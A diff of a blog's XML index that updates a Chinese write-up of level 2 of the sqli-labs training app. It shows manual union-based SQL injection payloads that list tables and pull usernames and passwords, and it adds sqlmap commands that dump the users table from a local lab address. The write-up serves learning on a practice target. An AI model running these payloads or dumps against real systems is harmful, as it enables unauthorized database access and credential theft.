@@ -1717,10 +1717,9 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlilabs第二关</title>
+    <title>sqlilabs第二关（sqlmap初体验）</title>
     <url>/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/</url>
-    <content><![CDATA[<p>先来一遍基本流程</p>
-<ol>
+    <content><![CDATA[<h1 id="先来一遍基本流程"><a href="#先来一遍基本流程" class="headerlink" title="先来一遍基本流程"></a>先来一遍基本流程</h1><ol>
 <li>判断注入类型</li>
 <li>判断字段数</li>
 <li>判断回显点</li>
@@ -1731,7 +1730,7 @@
 </ol>
 <span id="more"></span>
 
-<p>第二关没什么好说的了，思路和第一关大同小异，只是判断注入类型的时候，这里是整数型，也就是没有单引号，后面也不用加注释符号，这里需要注意的是，用到where 的时候，=的东西如果是字符串，不要忘记加  ‘  ‘  。</p>
+<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>第二关没什么好说的了，思路和第一关大同小异，只是判断注入类型的时候，这里是整数型，也就是没有单引号，后面也不用加注释符号，这里需要注意的是，用到where 的时候，=的东西如果是字符串，不要忘记加  ‘  ‘  。</p>
 <p>然后就是命令再熟悉一下</p>
 <p>爆表名</p>
 <p><code>id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code>(schema是构架的意思)</p>
@@ -1741,6 +1740,20 @@
 <p><code>id=-1 union select 1,group_concat(username,1,password),3 from security.users</code></p>
 <p>最后得出结果</p>
 <p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120190354876.png" alt="image-20220120190354876"></p>
+<h1 id="利用sqlmap"><a href="#利用sqlmap" class="headerlink" title="利用sqlmap"></a>利用sqlmap</h1><p>安装：<code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></p>
+<p>详细用法可参考readme.md文件</p>
+<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>python sqlmap.py -u http://192.168.153.133/sqli-labs-master/Less-2/?id=1</code></p>
+<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120194754745.png" alt="image-20220120194754745"></p>
+<p>这里推荐了4种注入方法，其实这一步做不做无所谓。主要是获取数据库名</p>
+<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195046058.png" alt="image-20220120195046058"></p>
+<p><strong>注意：命令对大小写敏感</strong></p>
+<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195345729.png" alt="image-20220120195345729"></p>
+<h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p>执行 </p>
+<p><code>python sqlmap.py -u http://192.168.153.133/sqli-labs-master/Less-2/?id=1 -D security -T users --dump</code></p>
+<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195606377.png" alt="image-20220120195606377"></p>
+<p>同样也可以使用该命令格式爆其他表数据，如emalis</p>
+<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195802180.png" alt="image-20220120195802180"></p>
+<p>相比于手工注入简单多了哦</p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
